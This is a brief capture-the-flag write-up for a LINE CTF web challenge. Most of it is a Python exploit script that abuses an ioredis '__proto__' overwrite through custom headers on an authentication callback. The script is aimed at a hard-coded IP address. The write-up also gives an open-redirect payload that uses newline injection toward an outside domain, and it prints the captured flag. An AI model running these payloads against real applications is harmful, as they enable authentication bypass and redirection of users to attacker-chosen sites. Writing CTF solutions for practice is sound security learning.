# Description

- ioredis: overwrites a `__proto__`.

```python
from requests import *
import string
from random import choices


username = ''.join(choices(string.ascii_letters, k=12))
password = "asd123k1m3klkemkd"

print(username)

s = Session()
url = "http://hhhhhhhref:3000"
url = "http://34.84.251.135:3000"
data = {"name" : username, "password" : password}
r = s.post(f"{url}/api/auth/register", data=data)
print(r.status_code)

r = s.get(f"{url}/api/auth/csrf")
csrf_token = r.json()['csrfToken']

print(csrf_token)

data = {"csrfToken" : csrf_token, "name" : username, "password" : password}
headers = {"x-user-token-key" : "__proto__", "x-user-token-value" : "b"}
r1 = s.post(f"{url}/api/auth/callback/credentials", headers=headers, data=data, allow_redirects=False)

print(r1.status_code)
print(r1.headers)
```

- Open redirect: `http://hhhhhhhref:3000/rdr?errorCode=../../../%0a//wooeong.kr/zxc`

**Flag: `LINECTF{7320a1b512380dd4e0452f9fc3166201}`**
